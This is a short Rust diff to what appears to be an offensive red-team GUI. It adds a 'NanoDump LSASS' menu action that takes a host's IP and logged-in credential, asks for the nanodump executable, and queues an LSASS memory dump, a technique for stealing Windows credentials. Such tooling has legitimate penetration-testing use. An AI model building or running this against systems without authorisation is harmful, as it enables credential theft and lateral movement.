@@ -1215,6 +1215,32 @@ impl SnarlViewer<WorkflowNode> for WorkflowViewer {
                     }
                     ui.close();
                 }
+                if ui.button("🧬 NanoDump LSASS").clicked() {
+                    if let WorkflowNode::HostNode {
+                        ip,
+                        hostname,
+                        logged_in_cred,
+                        ..
+                    } = &snarl[node]
+                    {
+                        if let Some(cred) = self.resolve_cred(logged_in_cred) {
+                            if let Some(path) = rfd::FileDialog::new()
+                                .add_filter("NanoDump binary", &["exe"])
+                                .set_title("Select nanodump.x64.exe")
+                                .pick_file()
+                            {
+                                self.dump_requests.push((
+                                    node,
+                                    ip.clone(),
+                                    hostname.clone(),
+                                    format!("NANODUMP:{}", path.display()),
+                                    cred,
+                                ));
+                            }
+                        }
+                    }
+                    ui.close();
+                }
             });
 
             // "Get Console" — only offered on pwned hosts (admin == true)
